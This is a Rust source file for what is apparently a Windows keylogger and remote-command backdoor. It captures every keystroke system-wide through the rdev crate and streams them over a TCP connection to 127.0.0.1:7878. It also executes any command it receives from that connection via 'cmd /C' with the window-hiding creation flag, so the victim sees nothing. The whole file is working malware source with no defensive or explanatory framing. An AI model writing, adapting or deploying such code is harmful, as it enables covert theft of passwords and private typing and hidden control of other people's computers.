mod capturer;

use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
use tokio::sync::mpsc;
use tokio::net::TcpStream;
use rdev::{Event, listen};
use std::process::Command;
use std::os::windows::process::CommandExt;

enum Data {
    Keystroke(Vec<u8>),
    Screenshot(Vec<u8>),
}

impl Data {
    fn process(self) -> Vec<u8> {
        match self {
            Data::Keystroke(data) => {
                let mut data = String::from_utf8_lossy(&data).into_owned();
                data.push_str("keystroke_reader");
                data.as_bytes().to_owned()
            }
            Data::Screenshot(data) => {
                let mut data = String::from_utf8_lossy(&data).into_owned();
                data.push_str("screenshot");
                data.as_bytes().to_owned()
            }
        }
    }
}

#[tokio::main]
async fn main() -> io::Result<()> {
    let socket = TcpStream::connect("127.0.0.1:7878").await?;
    let (mut rd, mut wr) = io::split(socket);
    let (tx, mut rx) = mpsc::channel(16);

    let tx_clone = tx.clone();
    tokio::task::spawn_blocking( move || {
        let callback = move |event: Event| {
            match event.name {
                Some(string) => {
                    let bytes = string.as_bytes();
                    tx_clone.blocking_send(Data::Keystroke(bytes.to_owned())).expect("cannot send data")
            },
                None => (),
            }
        };

        if let Err(error) = listen(callback) {
            println!("{:?}", error);
        }
    });

    tokio::spawn(async move  {
        while let Some(data) = rx.recv().await {
            wr.write_all(&data.process()).await?;
        }

        Ok::<_, io::Error>(())
    });

    let mut buf = vec![0; 256];

    loop {
        let n = rd.read(&mut buf).await?;

        if n == 0 {
            break;
        }

        let command = std::str::from_utf8(&buf[..n]);
        
        match command {
            Ok(command) => {
                Command::new("cmd")
                    .args(["/C", command])
                    .creation_flags(0x08000000) 
                    .output()
                    .expect("failed to excute command");
            }
            Err(_) => println!("cannot decode bytes to str")
        }
    }

    Ok(())
}
